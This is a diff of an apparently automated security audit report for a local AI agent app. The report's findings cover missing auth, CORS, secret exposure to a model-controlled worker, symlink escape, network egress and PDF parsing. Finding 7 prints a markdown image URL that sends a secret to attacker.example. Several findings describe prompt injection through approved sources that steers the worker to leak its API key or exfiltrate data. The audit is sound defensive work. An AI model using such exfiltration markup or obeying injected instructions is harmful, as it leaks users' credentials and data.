@@ -3,23 +3,21 @@
 ## Scope
 - Scan mode: repository-wide Codex Security scan.
 - Repository root: `C:\Users\madse\Documents\cli-agent`.
-- Commit: `e9a3e8b`.
-- Scan id: `e9a3e8b_20260618T004757Z`.
-- Threat model: generated during Phase 1 and copied to `C:\tmp\codex-security-scans\cli-agent\e9a3e8b_20260618T004757Z\artifacts\01_context\threat_model.md`.
-- Worklist coverage: deterministic `rank_input.csv` produced 28 source/runtime rows; all 28 were copied into `deep_review_input.csv` and closed in `work_ledger.jsonl`.
-- Validation status: focused tests passed with `18 passed`; validation used code trace, command-construction checks, existing tests, and a bounded symlink harness attempt.
-- Main exclusions and limitations: no public deployment evidence was present; Docker daemon/Copilot runtime reproduction was not required; Windows symlink reproduction for finding 2 was blocked by local administrator privilege requirements; no malicious PDF was generated for finding 4.
-- Final artifacts: markdown report at `C:\tmp\codex-security-scans\cli-agent\e9a3e8b_20260618T004757Z\report.md` and HTML report at `C:\tmp\codex-security-scans\cli-agent\e9a3e8b_20260618T004757Z\report.html`.
+- Commit: `f3aa271`.
+- Scan id: `f3aa271_20260618T114122Z`.
+- Worklist coverage: 41 tracked source/config/runtime rows reviewed; generated `python-agent-runs` and `frontend/.next` rows were excluded from the canonical tracked-source worklist, and `worker/Dockerfile` was added back explicitly.
+- Validation status: focused tests passed with `26 passed`; local harnesses validated wildcard CORS, in-run artifact reads, markdown remote image rendering, and symlink behavior constraints.
+- Main limitations: no live Docker/Copilot run, no malicious PDF PoC, and Windows symlink creation was blocked by local privilege requirements.
+- Final artifacts: markdown report at `C:\tmp\codex-security-scans\cli-agent\f3aa271_20260618T114122Z\report.md` and HTML report at `C:\tmp\codex-security-scans\cli-agent\f3aa271_20260618T114122Z\report.html`.
 
 ### Scan Summary
 | Field | Value |
 | --- | --- |
-| Reportable findings | 4 |
-| Severity mix | 3 medium, 1 low |
-| Confidence mix | 2 high, 2 medium |
-| Coverage | 28/28 deep-review rows closed; 13 repository coverage rows recorded |
-| Validation mode | Static trace, focused tests, command-construction checks, bounded local reproduction attempt |
-| Key phase artifacts | `C:\tmp\codex-security-scans\cli-agent\e9a3e8b_20260618T004757Z\artifacts\02_discovery\finding_discovery_report.md`, `C:\tmp\codex-security-scans\cli-agent\e9a3e8b_20260618T004757Z\artifacts\05_findings\validation_summary.md`, `C:\tmp\codex-security-scans\cli-agent\e9a3e8b_20260618T004757Z\artifacts\05_findings\attack_path_analysis_report.md` |
+| Reportable findings | 7 |
+| Severity mix | 5 medium, 2 low |
+| Confidence mix | 4 high, 3 medium |
+| Coverage | 41/41 deep-review rows closed; 14 coverage rows recorded |
+| Validation mode | Static trace, focused tests, local HTTP/file/markdown harnesses |
 
 ## Threat Model
 
@@ -111,156 +109,239 @@ Low findings would be hardening gaps, confusing failure modes, or developer-foot
 
 | # | Finding | Severity | Confidence | Category |
 | --- | --- | --- | --- | --- |
-| 1 | [Model-controlled worker can disclose COPILOT_PROVIDER_API_KEY through tool output and final chat context](#1-model-controlled-worker-can-disclose-copilotproviderapikey-through-tool-output-and-final-chat-context) | medium | high | Secret exposure / agent-tool boundary failure |
-| 2 | [Worker-created symlinks in the writable bind mount can make the host read or overwrite files outside the run folder](#2-worker-created-symlinks-in-the-writable-bind-mount-can-make-the-host-read-or-overwrite-files-outside-the-run-folder) | medium | medium | Symlink confused deputy / path traversal across container boundary |
-| 3 | [Model-controlled worker has unrestricted default Docker network egress despite network-boundary assumptions](#3-model-controlled-worker-has-unrestricted-default-docker-network-egress-despite-network-boundary-assumptions) | medium | high | Container egress control failure |
-| 4 | [Approved PDFs are parsed and fully extracted on the host before Docker worker limits apply](#4-approved-pdfs-are-parsed-and-fully-extracted-on-the-host-before-docker-worker-limits-apply) | low | medium | Host-side parser resource exhaustion |
+| 1 | [Unauthenticated wildcard-CORS HTTP API lets arbitrary browser origins drive and read local runs](#1-unauthenticated-wildcard-cors-http-api-lets-arbitrary-browser-origins-drive-and-read-local-runs) | medium | high | Missing authentication / permissive CORS |
+| 2 | [Artifact route serves arbitrary files inside a run folder, including copied approved inputs](#2-artifact-route-serves-arbitrary-files-inside-a-run-folder-including-copied-approved-inputs) | medium | high | Insecure direct object/file access |
+| 3 | [Model-controlled worker receives COPILOT_PROVIDER_API_KEY and can disclose it through output](#3-model-controlled-worker-receives-copilot_provider_api_key-and-can-disclose-it-through-output) | medium | high | Secret exposure / agent boundary failure |
+| 4 | [Worker-created symlinks in the writable bind mount can redirect host reads and writes outside the run folder](#4-worker-created-symlinks-in-the-writable-bind-mount-can-redirect-host-reads-and-writes-outside-the-run-folder) | medium | medium | Symlink confused deputy / file boundary escape |
+| 5 | [Docker worker defaults to unrestricted Docker networking when no network is configured](#5-docker-worker-defaults-to-unrestricted-docker-networking-when-no-network-is-configured) | medium | high | Container egress / SSRF |
+| 6 | [Approved PDFs are parsed and fully extracted on the host before Docker worker limits apply](#6-approved-pdfs-are-parsed-and-fully-extracted-on-the-host-before-docker-worker-limits-apply) | low | medium | Host-side parser resource exhaustion |
+| 7 | [Model-controlled markdown can trigger browser requests to attacker-controlled URLs](#7-model-controlled-markdown-can-trigger-browser-requests-to-attacker-controlled-urls) | low | medium | Browser-side data exfiltration via markdown media |
+
 
 ### Confidence Scale
 | Label | Meaning |
 | --- | --- |
-| high | direct source, configuration, or runtime evidence supports the finding, with no material unresolved reachability or exploitability blocker. |
-| medium | source evidence supports a plausible issue, but runtime behavior, deployment configuration, role reachability, type constraints, or exploit reliability still need proof. |
-| low | weak or incomplete evidence; include only when the user explicitly wants follow-up candidates in the final report. |
+| high | Direct source, configuration, or runtime evidence supports the finding, with no material unresolved reachability or exploitability blocker. |
+| medium | Source evidence supports a plausible issue, but runtime behavior, deployment configuration, role reachability, type constraints, or exploit reliability still need proof. |
+| low | Weak or incomplete evidence; included only for follow-up candidates. |
 
-### [1] Model-controlled worker can disclose COPILOT_PROVIDER_API_KEY through tool output and final chat context
+### [1] Unauthenticated wildcard-CORS HTTP API lets arbitrary browser origins drive and read local runs
 
 | Field | Value |
 | --- | --- |
 | Severity | medium |
 | Confidence | high |
-| Confidence rationale | Direct source and command-construction evidence shows the secret is injected into a shell-capable worker and returned output is not redacted; public deployment reachability is not established. |
-| Category | Secret exposure / agent-tool boundary failure |
-| CWE | CWE-200 Exposure of Sensitive Information; CWE-522 Insufficiently Protected Credentials; CWE-532 Insertion of Sensitive Information into Log File |
-| Affected lines | `cli_agent/services/prompt_service.py:40-41`; `cli_agent/services/docker_runner.py:49-50`; `cli_agent/services/docker_runner.py:113`; `cli_agent/services/artifact_service.py:32-60`; `cli_agent/services/artifact_service.py:149-150`; `cli_agent/controllers/chat_controller.py:45-50`; `cli_agent/agents/chat_agent.py:24-34` |
+| Confidence rationale | Harness/static validation supports this; remaining uncertainty is deployment-specific. |
+| Category | Missing authentication / permissive CORS |
+| CWE | CWE-306, CWE-346, CWE-942, CWE-200 |
+| Affected lines | `cli_agent/http_api.py:57-65; cli_agent/http_api.py:85-120; cli_agent/http_api.py:155-169; cli_agent/http_api.py:187-193; frontend/src/lib/api.ts:8-32` |
 
 #### Summary
-The worker is explicitly described as model-controlled, but the host passes `COPILOT_PROVIDER_API_KEY` into that worker while also enabling `bash` and returning worker output to callers. Prompt text and Docker filesystem hardening do not stop a process from reading its own environment, and no redaction occurs before `answer.md`, stderr, or tool envelopes are displayed or forwarded.
+The HTTP API accepts cross-origin browser requests by default and has no caller authentication. A page on another origin can enumerate approved source paths, start a chat job, poll the run result, and read artifact URLs when the backend is reachable.
 
 #### Validation
-Validation used static source-to-sink tracing, a bounded command-construction check, and focused tests. The command check showed `COPILOT_PROVIDER_API_KEY=CANARY_SECRET`, `--available-tools=view,create,edit,bash,grep,glob`, and `--allow-all-tools` in the Docker invocation. `python -m pytest tests\test_run_folders_artifacts_and_runner.py tests\test_schemas_and_sources.py -q` passed with 18 tests. No live Docker/Copilot run was needed to prove the source/control/sink tuple.
+A local HTTP harness saved under the scan artifacts showed Access-Control-Allow-Origin: * on /sources and /chat, and an unauthenticated POST /chat returned 202 with a pollable result. Focused tests passed with 26 passed.
 
 #### Dataflow
-`Streamlit/MCP prompt or approved-source instruction` -> `WorkerPromptService.build_prompt` -> `DockerRunner.build_command` -> `COPILOT_PROVIDER_API_KEY` in container env with shell-capable tools -> worker writes secret to `answer.md` or stderr -> `ArtifactService.collect` returns it -> Streamlit/MCP caller sees it and Streamlit chat sends tool output into the final model call.
+`attacker origin -> frontend/browser fetch -> cli_agent/http_api.py /sources or /chat -> ChatController/ToolManager -> run result and artifact URLs -> browser-readable response`
 
 #### Reachability
-A local/internal user of the proof harness or MCP client can trigger the tool path when the key is configured. The README states the app has no authentication and should not be exposed beyond trusted use without additional controls. That limits public likelihood, but the boundary crossing is real for the intended worker execution workflow.
+Reachable when cli-agent-http is running on localhost or exposed to a frontend/backend URL. The tool allowlist still limits which source files can be read, but the caller/origin boundary is missing.
 
 #### Severity
-Final severity is medium. The impact is high because provider credential disclosure is materially security-relevant, but likelihood is unknown from repository evidence because the app is documented as a local/internal proof harness rather than a public service. Evidence of broad deployment with untrusted users would raise severity; proof that only trusted operators can trigger worker runs would lower it.
+Medium: the issue exposes approved source-derived answers/artifacts and consumes worker capacity, but repository evidence frames this as a local/internal proof harness rather than a public multi-tenant service. Public deployment evidence would raise severity; an auth token plus strict origin allowlist would lower it.
 
 #### Remediation
-Do not pass provider API keys into the model-controlled worker unless the worker truly needs them. Prefer short-lived scoped tokens injected only into the Copilot process, not general shell environment. Remove `bash` unless required, redact known secret values from stdout/stderr/answer/manifest before returning them, and add tests with canary secrets to prove tool outputs and logs are scrubbed.
+Require authentication for /sources, /chat, /runs/*, and /artifacts/*; default CORS to a configured explicit origin, not *; reject unexpected Origin headers; add tests for cross-origin rejection and unauthenticated access.
 
-### [2] Worker-created symlinks in the writable bind mount can make the host read or overwrite files outside the run folder
+### [2] Artifact route serves arbitrary files inside a run folder, including copied approved inputs
+
+| Field | Value |
+| --- | --- |
+| Severity | medium |
+| Confidence | high |
+| Confidence rationale | Harness/static validation supports this; remaining uncertainty is deployment-specific. |
+| Category | Insecure direct object/file access |
+| CWE | CWE-639, CWE-862, CWE-200 |
+| Affected lines | `cli_agent/http_api.py:155-163; cli_agent/http_api.py:416-424; cli_agent/http_api.py:427-446; cli_agent/http_api.py:449-459; cli_agent/services/run_folder_service.py:36-42` |
+
+#### Summary
+The artifact endpoint validates that a requested file stays inside the selected run folder, but it does not require the file to be one of the artifact or trace paths the backend intentionally exposed. Any caller with a run_id can construct a file_id for raw copied inputs and other retained in-run files.
+
+#### Validation
+A local harness encoded input/sample_sources/dnd5e_hp_reference.md as a file_id and _artifact_path_from_id resolved and read the raw file. Existing tests prove traversal rejection but do not enforce manifest membership.
+
+#### Dataflow
+`HTTP caller -> /artifacts/{run_id}/{file_id} -> _decode_file_id -> run-root containment check -> target.read_bytes -> raw in-run file response`
+
+#### Reachability
+Self-created runs are enough to read copied approved inputs deterministically. Reading another user run requires learning that run_id, which is a separate precondition.
+
+#### Severity
+Medium: the issue bypasses the intended artifact exposure boundary and can disclose approved inputs/prompts/logs, but it remains scoped to files under a known run folder. Stronger cross-user run-id exposure or sensitive approved corpora would raise severity.
+
+#### Remediation
+Serve only files listed in the recorded manifest/tool envelope for that run, or issue unguessable per-file capabilities. Deny input/ and work/ by default. Add tests that encoded input paths and logs are rejected unless explicitly whitelisted.
+
+### [3] Model-controlled worker receives COPILOT_PROVIDER_API_KEY and can disclose it through output
+
+| Field | Value |
+| --- | --- |
+| Severity | medium |
+| Confidence | high |
+| Confidence rationale | Harness/static validation supports this; remaining uncertainty is deployment-specific. |
+| Category | Secret exposure / agent boundary failure |
+| CWE | CWE-200, CWE-522 |
+| Affected lines | `cli_agent/settings.py:64; cli_agent/services/docker_runner.py:147-168; cli_agent/services/docker_runner.py:64-66; cli_agent/services/artifact_service.py:30-65; cli_agent/managers/tool_manager.py:230-234; cli_agent/controllers/chat_controller.py:57-62; streamlit_app.py:109-119` |
+
+#### Summary
+The host passes COPILOT_PROVIDER_API_KEY into the worker container. The worker is model-controlled and has shell-capable tools, while returned answer, stderr, artifacts, tool messages, and final chat context are not redacted.
+
+#### Validation
+Static source-to-sink trace plus focused Docker command tests. docker_command.json redacts secret-looking env values, but the live worker receives the raw secret and output paths are not scrubbed.
+
+#### Dataflow
+`host env COPILOT_PROVIDER_API_KEY -> DockerRunner -e env -> model-controlled worker with bash/create/edit -> answer.md or stderr -> ArtifactService ToolEnvelope -> Streamlit/final model call`
+
+#### Reachability
+Any user or prompt-injected approved source that influences the worker can ask it to reveal process environment when the key is configured.
+
+#### Severity
+Medium: provider token disclosure is material, but it depends on the optional key being configured and on untrusted users/source content influencing worker output. Broad external use or high-privilege provider tokens would raise severity.
+
+#### Remediation
+Do not put provider credentials in the general worker environment. Use a narrow broker or short-lived process-scoped token, remove bash if not required, and redact configured secret values from stdout, stderr, answer.md, manifest, trace previews, and tool messages. Add canary-secret regression tests.
+
+### [4] Worker-created symlinks in the writable bind mount can redirect host reads and writes outside the run folder
 
 | Field | Value |
 | --- | --- |
 | Severity | medium |
 | Confidence | medium |
-| Confidence rationale | Source tracing shows host file operations follow worker-writable output paths without symlink checks; local Windows symlink reproduction was blocked by OS privilege, so platform behavior remains a deployment caveat. |
-| Category | Symlink confused deputy / path traversal across container boundary |
-| CWE | CWE-59 Improper Link Resolution Before File Access; CWE-22 Path Traversal; CWE-200 Exposure of Sensitive Information |
-| Affected lines | `cli_agent/services/docker_runner.py:33-34`; `cli_agent/services/docker_runner.py:49-50`; `cli_agent/services/docker_runner.py:121-124`; `cli_agent/services/artifact_service.py:32`; `cli_agent/services/artifact_service.py:102-105`; `cli_agent/services/artifact_service.py:108-118`; `cli_agent/services/artifact_service.py:188-189`; `streamlit_app.py:21-31` |
+| Confidence rationale | Static trace supports this, but runtime or deployment behavior still needs proof. |
+| Category | Symlink confused deputy / file boundary escape |
+| CWE | CWE-59, CWE-73, CWE-200 |
+| Affected lines | `cli_agent/services/docker_runner.py:49-50; cli_agent/services/docker_runner.py:64-66; cli_agent/services/artifact_service.py:30-33; cli_agent/services/artifact_service.py:109-125; cli_agent/services/docker_runner.py:442-445; cli_agent/services/artifact_service.py:175-209; streamlit_app.py:90-100` |
 
 #### Summary
-The worker can write inside `/workspace/output`, which is the host run folder bind mount. After the worker exits, host code reads `answer.md`, reads optional artifacts, and writes logs and `manifest.json` under that worker-writable tree without rejecting symlinks or verifying resolved paths remain inside the run folder.
+The worker can modify the writable /workspace/output bind mount before host post-processing. Host reads answer/artifacts and writes logs/manifest without lstat/no-follow checks or final run-root containment checks on the direct Streamlit path.
 
 #### Validation
-Validation used static trace, existing tests, and a bounded symlink harness attempt. The harness could not create a symlink on this Windows host because administrator privilege is required. That is a local OS constraint, not repository counterevidence. Focused artifact and source tests passed with 18 tests and showed the normal host read/write behavior is covered but symlink rejection is not tested.
+Static order proof supports the issue. A bounded local Windows symlink harness was blocked by WinError 1314, so platform-specific runtime proof remains open rather than disproven.
 
 #### Dataflow
-`attacker-influenced worker` -> creates `output/answer.md`, `output/graphs/leak.png`, or `output/logs/copilot.stdout.log` as a symlink -> host `_write_runner_logs` or `ArtifactService.collect` reads/writes the path -> file contents are returned as tool output/artifact or a writable host target is overwritten.
+`worker creates output symlink -> Docker exits -> ArtifactService read_text/glob/resolve or DockerRunner write_text -> host follows symlink -> Streamlit/final context or host file write`
 
 #### Reachability
-The path is reachable for any tool run where the worker follows attacker-controlled instructions strongly enough to create a symlink. Exploitability depends on symlink-preserving host/container filesystem behavior, which is realistic on Linux Docker. Repository evidence does not show public ingress, so likelihood is calibrated as unknown rather than high.
+Reachable for deployments whose bind mount permits symlink creation/following, especially Linux Docker hosts. Requires host account permission to read/write the target.
 
 #### Severity
-Final severity is medium. The impact is high because this breaks the intended worker-to-host filesystem boundary, but deployment reachability and local symlink behavior are not fully proven. A Linux bind-mount reproduction reading a sensitive host file would raise severity; a host configuration that rejects symlink creation/following would lower it.
+Medium: the bug crosses the intended worker/host filesystem boundary, but exploitability is platform-dependent and was not reproduced on this Windows host. Linux Docker reproduction would raise confidence/severity.
 
 #### Remediation
-Treat worker output as hostile. Use no-follow file opens or reject symlinks with `lstat` before every host read/write under the output tree. After resolving paths, require containment under the intended run/output directory and require regular files. Write logs and manifests to host-created paths that the worker cannot replace, and add regression tests with symlinked `answer.md`, `logs`, CSV, and PNG paths.
+Treat worker output as hostile. Use lstat and no-follow opens, require regular files, verify resolved paths remain under the run root before every read/write, recreate trusted output/log directories after worker exit, and store host logs/manifests outside worker-writable paths.
 
-### [3] Model-controlled worker has unrestricted default Docker network egress despite network-boundary assumptions
+### [5] Docker worker defaults to unrestricted Docker networking when no network is configured
 
 | Field | Value |
 | --- | --- |
 | Severity | medium |
 | Confidence | high |
-| Confidence rationale | Direct command-construction and test evidence shows no default network restriction, while the worker has shell-capable and network-capable tools; reachable targets depend on deployment network topology. |
-| Category | Container egress control failure |
-| CWE | CWE-200 Exposure of Sensitive Information; CWE-922 Insecure Storage or Transmission of Sensitive Information |
-| Affected lines | `cli_agent/services/docker_runner.py:27-29`; `cli_agent/services/docker_runner.py:49-50`; `cli_agent/services/docker_runner.py:97-113`; `cli_agent/settings.py:38`; `cli_agent/settings.py:59-61`; `worker/Dockerfile:1-5`; `cli_agent/services/prompt_service.py:21` |
+| Confidence rationale | Harness/static validation supports this; remaining uncertainty is deployment-specific. |
+| Category | Container egress / SSRF |
+| CWE | CWE-918, CWE-200 |
+| Affected lines | `cli_agent/settings.py:42-66; cli_agent/services/docker_runner.py:43-45; cli_agent/services/docker_runner.py:64-66; worker/Dockerfile:3-5` |
 
 #### Summary
-When `CLI_AGENT_DOCKER_NETWORK` is unset, DockerRunner does not provide a deny-by-default network mode. The worker is model-controlled, has `bash`, Python, Node, git, and CA certificates, and may hold approved source copies and provider environment values. The only no-network statement is prompt text and README guidance that network restriction is external.
+When CLI_AGENT_DOCKER_NETWORK is unset, DockerRunner omits --network, so Docker default networking applies. The worker has bash plus Python, Node, git, and CA certificates while holding copied approved sources and optional provider settings.
 
 #### Validation
-Validation used static trace, command-construction checks, tests, and documentation. The command check showed `--network` is absent by default while shell-capable tools are present. The focused tests passed and include an assertion that `--network` is absent by default and only added when configured.
+Static command construction and focused tests confirm --network is absent by default and only added when configured. The Dockerfile provides network-capable tooling.
 
 #### Dataflow
-`attacker-influenced worker` -> shell/Python/Node network client inside container -> Docker default bridge networking -> arbitrary external or host/internal destination -> exfiltration of copied approved sources, prompts, artifacts, or provider env values.
+`prompt-influenced worker -> shell/Python/Node/git network client -> Docker default bridge/host-reachable network -> attacker or internal destination`
 
 #### Reachability
-A user who can trigger a worker run can influence execution through prompts or approved-source prompt injection. The precise network targets depend on Docker host policy, but the repository default leaves egress to Docker defaults. Operator-provided `CLI_AGENT_DOCKER_NETWORK` is a mitigation, not the default control.
+Reachable whenever an untrusted prompt or approved source can influence worker behavior and the operator has not configured a restrictive Docker network.
 
 #### Severity
-Final severity is medium. The impact is high because uncontrolled egress from model-controlled execution can leak credentials and become an internal network pivot. Likelihood is unknown from repository deployment evidence, so the matrix lands at medium. Evidence of deployment with untrusted users and internal service reachability would raise severity; defaulting to `--network=none` would lower it.
+Medium: uncontrolled egress can exfiltrate approved sources and become an internal network pivot, but actual reachable targets depend on the operator Docker network.
 
 #### Remediation
-Default to `--network=none` for worker runs, then explicitly opt into a constrained provider-only network when needed. Enforce egress outside the prompt, document the secure default, and add tests that the default Docker command contains a deny-by-default network mode. Keep provider credentials out of general-purpose shell environments.
+Default to --network=none. Add an explicit opt-in for a constrained provider network or proxy. Test that default commands deny networking and document the secure default.
 
-### [4] Approved PDFs are parsed and fully extracted on the host before Docker worker limits apply
+### [6] Approved PDFs are parsed and fully extracted on the host before Docker worker limits apply
 
 | Field | Value |
 | --- | --- |
 | Severity | low |
 | Confidence | medium |
-| Confidence rationale | Static order-of-operations and tests prove host-side extraction occurs before worker limits; no malicious PDF PoC was generated and default active config uses a markdown sample. |
+| Confidence rationale | Static trace supports this, but runtime or deployment behavior still needs proof. |
 | Category | Host-side parser resource exhaustion |
-| CWE | CWE-400 Uncontrolled Resource Consumption; CWE-770 Allocation of Resources Without Limits or Throttling |
-| Affected lines | `cli_agent/managers/tool_manager.py:85-96`; `cli_agent/services/run_folder_service.py:36-43`; `cli_agent/services/run_folder_service.py:57-73`; `cli_agent/services/run_folder_service.py:80-84`; `cli_agent/services/approved_sources.py:99-118` |
+| CWE | CWE-400, CWE-770 |
+| Affected lines | `cli_agent/managers/tool_manager.py:101-117; cli_agent/services/run_folder_service.py:51-85; cli_agent/services/approved_sources.py:105-118; scripts/build_approved_sources.py:57-76; settings/approved_sources.5e_phb.example.json:1-114` |
 
 #### Summary
-PDF extraction runs in the host Python process before the Docker worker starts. Source byte limits bound the compressed PDF size but not parser CPU, page count, extracted text expansion, or output file size. A malicious approved PDF can therefore exhaust host resources outside the container limits intended for worker execution.
+Approved PDF extraction happens in the host Python process before Docker worker execution. Source byte limits do not bound parser CPU, page count, object count, recursion, or extracted text size.
 
 #### Validation
-Validation used static order-of-operations tracing and existing tests. `ToolManager.run_tool` calls `RunFolderService.copy_sources` before `DockerRunner.run`; `_extract_pdf_text` constructs `PdfReader`, loops every page with `extract_text`, accumulates all text, and writes the full `.pdf.txt`. Existing tests confirm PDF text preparation happens before worker execution. No malicious PDF was created during the scan.
+Static order trace shows copy_sources/extract PDFs runs before DockerRunner.run. No malicious PDF harness was generated; default active config uses a small markdown sample.
 
 #### Dataflow
-`approved third-party PDF` -> exact `source_paths` allowlist validation -> `copy_sources` -> `_extract_pdf_text` on host -> `PdfReader` and per-page `extract_text` -> unbounded `page_blocks` accumulation and `.pdf.txt` write -> host CPU, memory, or disk exhaustion before Docker timeout/resource limits.
+`approved PDF path -> ApprovedSourceService byte checks -> RunFolderService.copy_sources -> PdfReader and page.extract_text on host -> unbounded page_blocks/write_text`
 
 #### Reachability
-The default checked-in source config uses a small markdown file, but the repo includes PDF corpus tooling and an example PDF approved-source configuration. The issue matters when approved corpora include third-party or user-provided PDFs and a user/model can request them.
+Requires a malicious or adversarial PDF to be included in the approved corpus and requested by a user/model.
 
 #### Severity
-Final severity is low. Impact is medium availability loss to the app process, but the default active config is not a PDF and exploitability requires a malicious PDF to be approved. A reproduced small malicious PDF that reliably hangs or exhausts memory in a common configured corpus would raise severity; moving extraction into the constrained worker would lower it.
+Low: this is an availability issue gated by operator-approved PDFs. It would rise if untrusted PDF upload/approval is part of deployment.
 
 #### Remediation
-Move PDF extraction into the same constrained worker environment or a separate subprocess with time, memory, output-size, and page-count limits. Add maximum extracted text bytes per source and fail closed when exceeded. Add tests for page-count and extracted-output caps, and keep compressed-byte limits as a separate prefilter rather than the only control.
+Move extraction into a constrained worker or subprocess with timeout, memory, page-count, and output-byte caps. Fail closed when extracted text exceeds limits and add parser-limit tests.
 
+### [7] Model-controlled markdown can trigger browser requests to attacker-controlled URLs
 
-# Reviewed Surfaces
+| Field | Value |
+| --- | --- |
+| Severity | low |
+| Confidence | medium |
+| Confidence rationale | Static trace supports this, but runtime or deployment behavior still needs proof. |
+| Category | Browser-side data exfiltration via markdown media |
+| CWE | CWE-200 |
+| Affected lines | `frontend/src/components/chat-workbench.tsx:259; frontend/src/components/chat-workbench.tsx:288; frontend/src/components/chat-workbench.tsx:364-368; frontend/src/lib/types.ts:45; cli_agent/services/artifact_service.py:32` |
 
+#### Summary
+Assistant and worker-controlled markdown is rendered with ReactMarkdown defaults. Raw HTML is escaped, but normal markdown images/links with http(s) URLs are preserved, causing browser requests outside worker network controls.
+
+#### Validation
+A Node render harness produced an img tag and preload link for ![x](https://attacker.example/pixel?d=secret). No browser network capture was run.
+
+#### Dataflow
+`model/worker report_markdown -> frontend ToolResultPanel/ChatBubble -> MarkdownBlock -> ReactMarkdown default URL handling -> browser request to remote URL`
+
+#### Reachability
+Requires model or worker output to include a crafted markdown image or link, potentially via approved-source prompt injection.
+
+#### Severity
+Low: this can leak data only if sensitive text is encoded into a URL by model/worker output; it is not DOM XSS. Demonstrated sensitive exfiltration would raise severity.
+
+#### Remediation
+Disable image rendering for untrusted markdown or restrict allowed URI schemes/hosts with a custom urlTransform/components map. Consider rendering links as plain text unless explicitly trusted.
+
+## Reviewed Surfaces
 | Surface | Risk Area | Outcome | Notes |
 | --- | --- | --- | --- |
-| Streamlit/MCP model tool boundary | Secret/data exposure | Reported | `CLIAGENT-001` covers provider key exposure through a shell-capable worker and returned tool output. |
-| Docker worker bind mount to host post-processing | Path traversal / symlink confused deputy | Reported | `CLIAGENT-002` covers host reads/writes under worker-writable output paths without symlink or containment checks. |
-| Docker worker network | SSRF / network egress / data exfiltration | Reported | `CLIAGENT-003` covers default Docker networking for model-controlled workers when `CLI_AGENT_DOCKER_NETWORK` is unset. |
-| Approved source ingestion | Parser resource exhaustion | Reported | `CLIAGENT-004` covers host-side PDF parsing before Docker worker limits apply. |
-| Approved source path selection | Path traversal / arbitrary file read | Rejected | Configured paths are resolved under `repo_root`; model requests must exactly match loaded approved strings before source copy. |
-| Host Docker subprocess invocation | Host command injection / RCE | Rejected | Docker command is built as an argv list and run without a shell; prompt text is not interpolated into a host shell. |
-| OpenAI-compatible chat provider client | SSRF via app-side HTTP client | Rejected | `chat_base_url` is operator configuration, not user/model-selected input. |
-| Streamlit rendering | XSS / unsafe rendering | Rejected | No `unsafe_allow_html=True` was found; content-based secret and symlink risks are reported separately. |
-| MCP server exposure | Missing auth / network listener | Rejected | The MCP server is stdio-based and delegates to `ToolManager` validation. |
-| Dependency and worker image build inputs | Supply chain | Rejected | Floating image/package versions are hardening concerns, but no concrete compromised version or advisory path was validated. |
-| Worker runtime availability controls | DoS | Rejected with exception | Worker semaphore, timeout, PID, tmpfs, and source byte controls exist; the host-side PDF extraction exception is reported as `CLIAGENT-004`. |
-| Retained run artifacts | Sensitive data exposure | Rejected with exception | Existing retained manifest had no secrets; secret leakage into errors/manifests is covered by `CLIAGENT-001`. |
-| Generated approved-source settings | Path/config safety | Rejected with exception | Generated paths are repo-relative and oversized PDFs are rejected; approved PDFs still trigger `CLIAGENT-004`. |
-
+| HTTP API | Auth, CORS, job/artifact access | Reported | Findings 1 and 2 cover caller/origin and in-run file authorization. |
+| Docker worker boundary | Secrets, network, bind mount | Reported | Findings 3, 4, and 5 cover env secret exposure, symlink confused deputy, and default egress. |
+| Approved source ingestion | Path traversal and parser DoS | Reported / Rejected | Exact allowlist path traversal was rejected; host-side PDF parser limits are finding 6. |
+| Frontend renderer | Markdown and artifact display | Reported / Rejected | Remote markdown media is finding 7; raw HTML XSS was rejected because no rehypeRaw/dangerouslySetInnerHTML path was found. |
+| MCP server | Tool exposure | Rejected | stdio-only server delegates to ToolManager validation. |
+| Model tool dispatch | Multi-tool and unapproved paths | Rejected | One tool call enforced; requested sources must exactly match approved paths. |
+| Host Docker invocation | Host shell injection | Rejected | Docker is invoked as an argv list, not shell interpolation. |
+| Frontend config/build | Rewrites, proxy, package scripts | No issue found | No runtime proxy/rewrite or project lifecycle script issue found. |
+| Package markers/types/exceptions | Runtime sink coverage | Not applicable | Declarations only. |
 
 ## Open Questions And Follow Up
-- Run a targeted fix review for `cli_agent/services/docker_runner.py` and `cli_agent/services/artifact_service.py` after changing worker environment handling, default Docker networking, and symlink-safe artifact collection.
-- Add a focused regression test that injects a canary `COPILOT_PROVIDER_API_KEY` and asserts no tool envelope, stderr, manifest, or final chat message contains the canary.
-- On a Linux Docker host, reproduce the symlink artifact path with `output/answer.md`, `output/logs/copilot.stdout.log`, and `output/graphs/leak.png` to calibrate platform-specific exploitability.
-- Add a bounded parser harness for `cli_agent/services/run_folder_service.py` that enforces page-count and extracted-byte limits for approved PDFs.
+- After fixing HTTP auth/CORS, rerun a targeted review of `cli_agent/http_api.py` for artifact authorization and run ownership.
+- On a Linux Docker host, reproduce the symlink read/write cases for `output/answer.md`, `output/logs/copilot.stderr.log`, and `output/manifest.json`.
+- Add canary-secret tests proving `COPILOT_PROVIDER_API_KEY` never appears in answers, errors, traces, manifests, or final model messages.
